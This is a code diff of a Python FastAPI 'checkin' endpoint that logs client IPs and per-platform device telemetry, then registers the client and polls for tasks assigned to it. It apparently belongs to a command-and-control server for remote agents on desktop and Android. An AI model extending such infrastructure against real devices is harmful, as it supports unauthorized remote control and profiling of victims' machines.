@@ -40,16 +40,26 @@ app.add_middleware(
 async def checkin(client_id: str, platform: str, request: Request):
     client_ip = request.client.host
     
-    # Strictly necessary: Capture telemetry if sent via POST
-    telemetry = {}
+    # Capture telemetry if sent via POST
     if request.method == "POST":
         try:
             telemetry = await request.json()
-            print(f"[*] Telemetry from {client_id}: {telemetry.get('hostname')} | {telemetry.get('os_version')} | {telemetry.get('total_memory')}MB RAM")
-        except:
-            pass
+            hostname = telemetry.get('hostname', 'Unknown')
+            os_version = telemetry.get('os_version', 'Unknown')
+            
+            # Platform-specific logging logic
+            if platform == "android":
+                net = telemetry.get('network', 'N/A')
+                batt = telemetry.get('battery', 'N/A')
+                print(f"[*] [MOBILE] {client_id}: {hostname} | {os_version} | Net: {net} | Batt: {batt}")
+            else:
+                ram = telemetry.get('total_memory', 'Unknown')
+                print(f"[*] [DESKTOP] {client_id}: {hostname} | {os_version} | {ram}MB RAM")
+                
+        except Exception as e:
+            print(f"[-] Telemetry parsing error: {e}")
 
-    # 1. Register/Update the head in the DB (You can expand register_client to save telemetry later)
+    # 1. Register/Update the head in the DB
     await register_client(client_id, platform, client_ip)
     
     # 2. Check for specific tasks for this ID
